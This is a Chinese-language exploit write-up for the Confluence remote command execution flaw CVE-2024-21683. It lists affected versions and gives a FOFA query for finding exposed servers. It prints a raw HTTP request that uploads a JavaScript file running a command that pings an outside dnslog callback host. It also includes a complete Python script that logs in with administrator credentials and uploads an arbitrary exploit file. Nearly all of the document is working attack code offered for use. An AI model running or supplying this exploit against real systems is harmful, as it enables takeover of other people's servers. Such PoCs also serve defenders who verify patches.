## Confluence远程命令执行漏洞(CVE-2024-21683)

Confluence是Atlassian公司研发的一个专业的企业知识管理与协同软件。其存在远程命令执行漏洞，攻击者可以通过该漏洞获取服务器权限。***当然是有前提条件，需要有个账号：***

## 影响版本

```
Confluence Data Center = 8.9.0
8.8.0 <= Confluence Data Center <= 8.8.1
8.7.1 <= Confluence Data Center <= 8.7.2
8.6.0 <= Confluence Data Center <= 8.6.2
8.5.0 <= Confluence Data Center and Server <= 8.5.8 (LTS)
8.4.0 <= Confluence Data Center and Server <= 8.4.5
8.3.0 <= Confluence Data Center and Server <= 8.3.4
8.2.0 <= Confluence Data Center and Server <= 8.2.4
8.1.0 <= Confluence Data Center and Server <= 8.1.4
8.0.0 <= Confluence Data Center and Server <= 8.0.4
7.20.0 <= Confluence Data Center and Server <= 7.20.3 
7.19.0 <= Confluence Data Center and Server <= 7.19.21 (LTS)
7.18.0 <= Confluence Data Center and Server <= 7.18.3
7.17.0 <= Confluence Data Center and Server <= 7.17.5
```

## fofa

```
icon_hash="-305179312"
```

## poc

```bash
POST /admin/plugins/newcode/addlanguage.action HTTP/2
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 372
Content-Type: multipart/form-data; boundary=f6dae662e22371daece5ff851b1c4a39

--f6dae662e22371daece5ff851b1c4a39
Content-Disposition: form-data; name="newLanguageName"

test
--f6dae662e22371daece5ff851b1c4a39
Content-Disposition: form-data; name="languageFile"; filename="exploit.js"
Content-Type: text/javascript

new java.lang.ProcessBuilder["(java.lang.String[])"](["ping 5hnlyo.dnslog.cn"]).start()
--f6dae662e22371daece5ff851b1c4a39--
```



## python脚本

```python
import argparse
import os

import requests
from bs4 import BeautifulSoup

def GeyAltToken(url, proxy, session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    alttoken_url = f"{url}/admin/plugins/newcode/configure.action"
    resp = session.get(url=alttoken_url, headers=headers, verify=False, proxies=proxy, timeout=20)
    if "atlassian-token" in resp.text:
        soup = BeautifulSoup(resp.text, 'html.parser')
        meta_tag = soup.find('meta', {'id': 'atlassian-token', 'name': 'atlassian-token'})
        if meta_tag:
            content_value = meta_tag.get('content')
            return content_value

        else:
            print("Meta tag not found")

def LoginAsAdministrator(session, url, proxy, username, password):
    login_url = url + "/dologin.action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"os_username={username}&os_password={password}&login=%E7%99%BB%E5%BD%95&os_destination=%2F"
    session.post(url=login_url, headers=headers, data=data, proxies=proxy, verify=False, timeout=20)

def DoAuthenticate(session, url, proxy, password, alt_token):
    login_url = url + "/doauthenticate.action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"atl_token={alt_token}&password={password}&authenticate=%E7%A1%AE%E8%AE%A4&destination=/admin/viewgeneralconfig.action"
    session.post(url=login_url, headers=headers, data=data, proxies=proxy, verify=False, timeout=20)
def UploadEvilJsFile(session, url, proxy, jsFilename, jsFileContent, alt_token):
    url = f"{url}/admin/plugins/newcode/addlanguage.action"
    data = {
        "atl_token": alt_token,
        "newLanguageName": "test"
    }
    files = {
        "languageFile": (
        jsFilename, jsFileContent, "text/javascript")
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    session.post(url, headers=headers, data=data, files=files, verify=False, proxies=proxy, timeout=20)

def ParseArgs():
    parser = argparse.ArgumentParser(description="CVE-2024-21683-RCE")
    parser.add_argument("-u", "--url", type=str, help="target url to check, eg: http://192.168.198.1:8090", required=True)
    parser.add_argument("-p", "--proxy", type=str, default="http://127.0.0.1:8083", help="proxy url, eg: http://127.0.0.1:8083", required=False)
    parser.add_argument("-au", "--admin-username", type=str, help="The username of the user who is in the Administrators group", required=True)
    parser.add_argument("-ap", "--admin-password", type=str, help="The password of the user who is in the Administrators group", required=True)
    parser.add_argument("-f", "--file", type=str, help="exploit file", default="exploit.js", required=True)
    parser.add_argument("-n", "--name", type=str, help="newLanguageName", default="test", required=True)
    return parser.parse_args()

if __name__ == '__main__':
    args = ParseArgs()
    if not args.proxy:
        proxy = {}
    else:
        proxy = {
            "http": args.proxy,
            "https": args.proxy
        }
    session = requests.session()
    jsfn = os.path.basename(args.file)
    jsfc = open(args.file, "r", encoding="utf-8").read()
    LoginAsAdministrator(session, args.url.strip("/"), proxy, args.admin_username, args.admin_password)
    alt_token = GeyAltToken(args.url.strip("/"), proxy, session)
    DoAuthenticate(session, args.url.strip("/"), proxy, args.admin_username, alt_token)
    UploadEvilJsFile(session, args.url.strip("/"), proxy, jsfn, jsfc, alt_token)
```



## 漏洞来源

- https://github.com/W01fh4cker/CVE-2024-21683-RCE

  